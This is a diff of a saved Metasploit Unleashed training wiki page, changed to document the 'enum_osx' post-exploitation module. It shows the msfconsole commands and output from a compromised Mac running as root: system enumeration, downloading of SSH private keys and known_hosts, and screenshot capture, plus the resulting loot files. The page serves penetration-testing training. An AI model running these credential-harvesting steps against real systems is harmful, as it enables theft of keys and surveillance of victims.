@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>OS X Post Gather Modules - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="OS_X_Post_Gather_Modules" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:OS_X_Post_Gather_Modules&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=OS_X_Post_Gather_Modules&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=OS_X_Post_Gather_Modules&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,35 +57,115 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>OS X Post Gather Modules</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="OS_X_Post_Gather_Modules#column-one">navigation</a>, <a href="OS_X_Post_Gather_Modules#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
-<br />
-<br />
-</p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Contents</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="OS_X_Post_Gather_Modules#enum_osx"><span class="tocnumber">1</span> <span class="toctext">enum_osx</span></a></li>
+</ul>
+</td></tr></table>
 <p><br />
+</p>
+<h2> <span class="mw-headline" id="enum_osx"> enum_osx </span></h2>
+<p>The <b>"enum_osx"</b> post module gathers basic system information from Mac OS X Tiger, Leopard, Snow Leopard and Lion systems.
 <br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
 <br />
+<pre>
+msf > use post/osx/gather/enum_osx
+msf  post(enum_osx) > run
+
+[*] Running module against Victim.local
+[*] This session is running as root!
+[*] Saving all data to /root/.msf4/logs/post/enum_osx/Victim.local_20120926.3521
+[*] 	Enumerating OS
+[*] 	Enumerating Network
+[*] 	Enumerating Bluetooth
+[*] 	Enumerating Ethernet
+[*] 	Enumerating Printers
+[*] 	Enumerating USB
+[*] 	Enumerating Airport
+[*] 	Enumerating Firewall
+[*] 	Enumerating Known Networks
+[*] 	Enumerating Applications
+[*] 	Enumerating Development Tools
+[*] 	Enumerating Frameworks
+[*] 	Enumerating Logs
+[*] 	Enumerating Preference Panes
+[*] 	Enumerating StartUp
+[*] 	Enumerating TCP Connections
+[*] 	Enumerating UDP Connections
+[*] 	Enumerating Environment Variables
+[*] 	Enumerating Last Boottime
+[*] 	Enumerating Current Activity
+[*] 	Enumerating Process List
+[*] 	Enumerating Users
+[*] 	Enumerating Groups
+[*] .ssh Folder is present for Victim
+[*] 	Downloading id_dsa
+[*] 	Downloading known_hosts
+[*] .gnupg Folder is present for Victim
+[*] 	Downloading ls: /Users/Victim/.gnupg: No such file or directory
+[*] Capturing screenshot
+[*] Capturing screenshot for each loginwindow process since privilege is root
+[*] 	Capturing for PID:2508
+<span style='color:#00ff00;'>...snip...</span>
+[*] Post module execution completed
+</pre>
+</p><p><pre>
+root@kali:~/.msf4/logs/post/enum_osx/RJLAP4.local_20120926.3521# ls
+Airport.txt                Firewall.txt        OS.txt                                               TCP Connections.txt
+Applications.txt           Frameworks.txt      OS X Gather Mac OS X System Information Enumeration  UDP Connections.txt
+Bluetooth.txt              Groups.txt          Preference Panes.txt                                 USB.txt
+Current Activity.txt       Known Networks.txt  Printers.txt                                         Users.txt
+Development Tools.txt      Last Boottime.txt   Process List.txt
+Environment Variables.txt  Logs.txt            screenshot_2058.jpg
+Ethernet.txt               Network.txt         StartUp.txt
+</pre>
+</p><p><pre>
+root@kali:~/.msf4/logs/post/enum_osx/Victim.local_20120926.3521# more Firewall.txt 
+Firewall:
+
+    Firewall Settings:
+
+      Mode: Block all incoming connections
+      Firewall Logging: Yes
+      Stealth Mode: Yes
+
+</pre>
+</p><p><pre>
+root@kali:~/.msf4/logs/post/enum_osx/Victim.local_20120926.3521# more OS.txt 
+Software:
+
+    System Software Overview:
+
+      System Version: Mac OS X 10.7.4 (11E53)
+      Kernel Version: Darwin 11.4.0
+      Boot Volume: Macintosh HD
+      Boot Mode: Normal
+      Computer Name: Victim
+      User Name: System Administrator (root)
+      Secure Virtual Memory: Enabled
+      64-bit Kernel and Extensions: Yes
+      Time since boot: 12:13
+</pre>
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
+Preprocessor visited node count: 18/1000000
+Preprocessor generated node count: 94/1000000
 Post‐expand include size: 0/2097152 bytes
 Template argument size: 0/2097152 bytes
 Highest expansion depth: 2/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:481-0!*!*!*!en!*!* and timestamp 20131123154507 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=OS_X_Post_Gather_Modules&amp;oldid=1555">http://www.offensive-security.com/w/index.php?title=OS_X_Post_Gather_Modules&amp;oldid=1555</a>"</div>
 							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
 													</div>
 						
@@ -521,4 +601,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.181 secs. --></body></html>
